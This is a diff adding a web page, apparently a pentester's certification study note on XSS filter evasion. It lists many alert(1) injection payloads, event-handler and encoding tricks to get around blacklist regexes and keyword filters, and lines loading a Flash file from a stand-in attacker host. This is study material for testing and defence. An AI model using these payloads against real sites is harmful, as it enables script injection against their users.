@@ -1,0 +1,958 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>4 - XSS Filter Evasion |</title>
+<meta name="description" content="Bypass blacklisting Filters, sanitization and Browser Filters ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="4 - XSS Filter Evasion">
+<meta property="og:url" content="http://localhost:4000/notes/ewptx/xssfilter/">
+
+
+  <meta property="og:description" content="Bypass blacklisting Filters, sanitization and Browser Filters ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header4.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-11-29T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ewptx/xssfilter/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header4.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          4 - XSS Filter Evasion
+
+        
+      </h1>
+      
+        <p class="page__lead">Bypass blacklisting Filters, sanitization and Browser Filters
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  5 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/" class="active">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="4 - XSS Filter Evasion">
+    <meta itemprop="description" content="Bypass blacklisting Filters, sanitization and Browser Filters">
+    <meta itemprop="datePublished" content="2023-11-29T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#filter-evasion-and-waf-bypassing">Filter Evasion and WAF Bypassing</a>
+    <ul>
+      <li><a href="#bypassing-blackliting-filters">Bypassing Blackliting Filters</a></li>
+      <li><a href="#modsecurity--script-tag-based-xss-vectors-rule">ModSecurity &gt; Script Tag Based XSS Vectors Rule</a></li>
+      <li><a href="#keyword-based-filters">Keyword Based Filters</a></li>
+      <li><a href="#bypassing-sanitization">Bypassing Sanitization</a></li>
+      <li><a href="#bypassing-browser-filters">Bypassing Browser Filters</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="filter-evasion-and-waf-bypassing">Filter Evasion and WAF Bypassing</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+http://html5sec.org/
+</code></pre></div></div>
+
+<ul>
+  <li>Common scenarios</li>
+</ul>
+
+<ol>
+  <li>The XSS vector is blocked by the application or something else</li>
+  <li>The XSS vector is sanitized</li>
+  <li>The XSS vector is filtered or blocked by the browser</li>
+</ol>
+
+<h2 id="bypassing-blackliting-filters">Bypassing Blackliting Filters</h2>
+
+<p>Its the most common. Their goal is to detect specific patterns and prevent malicious behaviors.</p>
+
+<h3 id="inject-script-code">Inject Script Code</h3>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+
+<span class="err">#</span> <span class="nx">The</span> <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> <span class="nx">tag</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">primary</span> <span class="nx">method</span> <span class="nx">which</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">to</span> <span class="nx">execute</span> <span class="nx">client</span><span class="o">-</span><span class="nx">side</span> <span class="nx">scripting</span> <span class="nx">code</span> <span class="nx">such</span> <span class="k">as</span> <span class="nx">javascript</span><span class="p">.</span>
+</code></pre></div></div>
+
+<h3 id="bypassing-weak-script-tag-banning">Bypassing Weak script Tag Banning</h3>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="nx">Upper</span> <span class="nx">and</span> <span class="nx">Lower</span><span class="o">-</span><span class="k">case</span> <span class="nx">characters</span>
+<span class="o">-</span> <span class="nx">Upper</span> <span class="nx">and</span> <span class="nx">Lower</span><span class="o">-</span><span class="k">case</span> <span class="nx">without</span> <span class="nx">closing</span> <span class="nx">tag</span>
+<span class="o">-</span> <span class="nx">Random</span> <span class="nx">string</span> <span class="nx">after</span> <span class="nx">the</span> <span class="nx">tag</span> <span class="nx">name</span>
+<span class="o">-</span> <span class="nx">Newline</span> <span class="nx">after</span> <span class="nx">the</span> <span class="nx">tag</span> <span class="nx">name</span>
+<span class="o">-</span> <span class="nx">Nested</span> <span class="nx">tags</span>
+<span class="o">-</span> <span class="nx">NULL</span> <span class="nf">byte </span><span class="p">(</span><span class="nx">IE</span> <span class="nx">up</span> <span class="nx">to</span> <span class="nx">v9</span><span class="p">)</span>
+<span class="err">#</span> <span class="nx">examples</span> <span class="k">in</span> <span class="nx">images</span>
+</code></pre></div></div>
+
+<h2 id="modsecurity--script-tag-based-xss-vectors-rule">ModSecurity &gt; Script Tag Based XSS Vectors Rule</h2>
+<p>There are several alternatives in which its possible to run our code, such as different HTML tags and related event handlers.</p>
+
+<h3 id="beyond-script-tag-using-html-attributes">Beyond script Tag… Using HTML Attributes</h3>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert(1)</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">show</span><span class="o">&lt;</span><span class="sr">/a</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">data:text/html;base64,&lt;alert(1) encoded&gt;</span><span class="dl">"</span><span class="nx">show</span><span class="o">&lt;</span><span class="sr">/a</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">action</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert(1)</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="nx">button</span><span class="o">&gt;</span><span class="nx">send</span><span class="o">&lt;</span><span class="sr">/button&gt;&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="nx">x</span><span class="o">&gt;&lt;</span><span class="sr">/form&gt;&lt;button form="x" formaction="javascript:alert</span><span class="se">(</span><span class="sr">1</span><span class="se">)</span><span class="sr">"&gt;send&lt;/</span><span class="nx">button</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert(1)</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">data:text/html;base64, &lt;alert(1) encoded&gt;</span><span class="dl">"</span><span class="o">&gt;</span>
+
+<span class="err">#</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/evilcos/xss.swf</span>
+<span class="o">&lt;</span><span class="nx">object</span> <span class="nx">data</span><span class="o">=</span><span class="dl">"</span><span class="s2">//hacker.site/xss.swf</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">embed</span> <span class="nx">code</span><span class="o">=</span><span class="dl">"</span><span class="s2">//hacker.site/xss.swf</span><span class="dl">"</span> <span class="nx">allowscriptaccess</span><span class="o">=</span><span class="nx">always</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h3 id="beyond-script-tag-using-html-events">Beyond script Tag… Using HTML Events</h3>
+<ul>
+  <li>Events are they way that HTML DOM adds interactivity between the website and its visitors; This happens simply by executing the client-side code (e.g, JavaScript)</li>
+</ul>
+
+<p>Almost all event handler identifier start with <strong>on</strong> and are followerd by the name of the event. One of the most used is <strong>onerror</strong>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>→ but, there are maybe other events: http://help.dottoro.com/lhwfcplu.php</p>
+
+<p>Examples:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">body</span> <span class="nx">onload</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">image</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="p">:</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">isindex</span> <span class="nx">onmouseover</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert(1)</span><span class="dl">"</span> <span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">oninput</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;&lt;</span><span class="nx">input</span><span class="o">&gt;&lt;</span><span class="sr">/form</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">texarea</span> <span class="nx">autofocus</span> <span class="nx">onfocus</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">oncut</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">svg</span> <span class="nx">onload</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">keygen</span> <span class="nx">autofocus</span> <span class="nx">onfocus</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="dl">"</span><span class="s2">&gt;
+&lt;video&gt;&lt;source onerror=</span><span class="dl">"</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="dl">"</span><span class="s2">&gt;
+&lt;marquee onstart=alert(1)&gt;
+</span></code></pre></div></div>
+
+<ul>
+  <li>From a defensive point of view, the solution is to filter all the events that start with <strong>on</strong> in order to block this injection point.</li>
+</ul>
+
+<p>This is a very common regex you might find used widely:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nx">on</span><span class="err">\</span><span class="nx">w</span><span class="o">+</span><span class="err">\</span><span class="nx">s</span><span class="o">*=</span><span class="p">)</span>
+
+<span class="err">#</span> <span class="nx">We</span> <span class="nx">can</span> <span class="nx">bypass</span> <span class="k">this</span> <span class="nx">filter</span><span class="p">:</span>
+<span class="o">&lt;</span><span class="nx">svg</span><span class="o">/</span><span class="nx">onload</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">svg</span><span class="c1">//////onload=alert(1)&gt;</span>
+<span class="o">&lt;</span><span class="nx">svg</span> <span class="nx">id</span><span class="o">=</span><span class="nx">x</span><span class="p">;</span> <span class="nx">onload</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">svg</span> <span class="nx">id</span><span class="o">=</span><span class="dl">'</span><span class="s1">x</span><span class="dl">'</span> <span class="nx">onload</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>So, we have an <strong>Upgrade</strong>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(?</span><span class="nx">i</span><span class="p">)([</span><span class="err">\</span><span class="nx">s</span><span class="err">\</span><span class="dl">"</span><span class="s2">'`;</span><span class="se">\</span><span class="s2">/0-9</span><span class="se">\</span><span class="s2">=]+on</span><span class="se">\</span><span class="s2">w+</span><span class="se">\</span><span class="s2">s*=)
+</span></code></pre></div></div>
+
+<ul>
+  <li>However, Some browsers convert the control character to a space, thus the \s meta-character is not enough to cover all possible chars.</li>
+</ul>
+
+<p>We can bypass that too:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">svg</span> <span class="nx">onload</span><span class="o">%</span><span class="mi">09</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span> <span class="err">#</span> <span class="nx">Works</span> <span class="k">in</span> <span class="nx">all</span> <span class="nx">browsers</span> <span class="nx">except</span> <span class="nx">Safari</span>
+<span class="o">&lt;</span><span class="nx">svg</span> <span class="o">%</span><span class="mi">09</span><span class="nx">onload</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">svg</span> <span class="o">%</span><span class="mi">09</span><span class="nx">onload</span><span class="o">%</span><span class="mi">20</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">svg</span> <span class="nx">onload</span><span class="o">%</span><span class="mi">09</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">2</span><span class="nx">C</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">svg</span> <span class="nx">onload</span><span class="o">%</span><span class="mi">0</span><span class="nx">B</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>  <span class="err">#</span> <span class="nx">IE</span> <span class="nx">only</span>
+</code></pre></div></div>
+
+<p>Browsers are in continuous evolution; Therefore, some of the chars allowed may not work anymore. So, Shazzer Fuzz DB has created two fuzzer tests:</p>
+
+<p>→ http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name</p>
+
+<p>→ http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name</p>
+
+<p>To data, a valid regex rule should be the following:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(?</span><span class="nx">i</span><span class="p">)([</span><span class="err">\</span><span class="nx">s</span><span class="err">\</span><span class="dl">"</span><span class="s2">'`;</span><span class="se">\</span><span class="s2">/0-9</span><span class="se">\</span><span class="s2">=</span><span class="se">\</span><span class="s2">x00</span><span class="se">\</span><span class="s2">x09</span><span class="se">\</span><span class="s2">x0A</span><span class="se">\</span><span class="s2">x0C</span><span class="se">\</span><span class="s2">0x0D</span><span class="se">\</span><span class="s2">x3B</span><span class="se">\</span><span class="s2">x2C</span><span class="se">\</span><span class="s2">x28</span><span class="se">\</span><span class="s2">x3B]+on</span><span class="se">\</span><span class="s2">w+[</span><span class="se">\</span><span class="s2">s</span><span class="se">\</span><span class="s2">x00</span><span class="se">\</span><span class="s2">x09</span><span class="se">\</span><span class="s2">x0A</span><span class="se">\</span><span class="s2">x0C</span><span class="se">\</span><span class="s2">0x0D</span><span class="se">\</span><span class="s2">x3B</span><span class="se">\</span><span class="s2">x2C</span><span class="se">\</span><span class="s2">x28</span><span class="se">\</span><span class="s2">x3B]*?=)
+</span></code></pre></div></div>
+
+<h2 id="keyword-based-filters">Keyword Based Filters</h2>
+<p>There are filters focused on preventing scripting mode such as <strong>alert, javascript, eval</strong></p>
+
+<h3 id="char-escaping">Char Escaping</h3>
+<p>Here we see Unicode Escaping without using native functions:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="err">\</span><span class="nf">u0061lert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="err">\</span><span class="nx">u0061</span><span class="err">\</span><span class="nx">u006</span><span class="err">\</span><span class="nx">u0065</span><span class="err">\</span><span class="nx">u0072</span><span class="err">\</span><span class="nf">u0074</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>Unicode escaping using native functions. Eval is just one of many:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">eval</span><span class="p">(</span><span class="dl">"</span><span class="se">\</span><span class="s2">u0061lert(1)</span><span class="dl">"</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">eval</span><span class="p">(</span><span class="dl">"</span><span class="se">\</span><span class="s2">u0061</span><span class="se">\</span><span class="s2">u006</span><span class="se">\</span><span class="s2">u0065</span><span class="se">\</span><span class="s2">u0072</span><span class="se">\</span><span class="s2">u0074</span><span class="se">\</span><span class="s2">u0028</span><span class="se">\</span><span class="s2">u0031</span><span class="se">\</span><span class="s2">u0029</span><span class="dl">"</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>IF the filtered vector is within a string, in addition to Unicode, there are multiple escapses we may adopt:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="se">\</span><span class="s2">u0061lert(1)</span><span class="dl">"</span><span class="o">/&gt;</span>
+<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">eval('</span><span class="se">\</span><span class="s2">141lert(1)')</span><span class="dl">"</span><span class="o">/&gt;</span>     <span class="err">#</span> <span class="nx">octal</span> <span class="nx">escape</span>
+<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">eval('</span><span class="se">\</span><span class="s2">x61lert(1)')</span><span class="dl">"</span><span class="o">/&gt;</span>     <span class="err">#</span> <span class="nx">hexa</span> <span class="nx">escape</span>
+
+<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">eval('&amp;#x0061;lert(1)')</span><span class="dl">"</span><span class="o">/&gt;</span> <span class="err">#</span> <span class="nx">hexa</span> <span class="nx">numeric</span> <span class="nx">char</span> <span class="nx">reference</span>
+<span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="s2">eval('&amp;#97;lert(1)')</span><span class="dl">"</span><span class="o">/&gt;</span>    <span class="err">#</span> <span class="nx">decimal</span> <span class="nx">NCR</span>
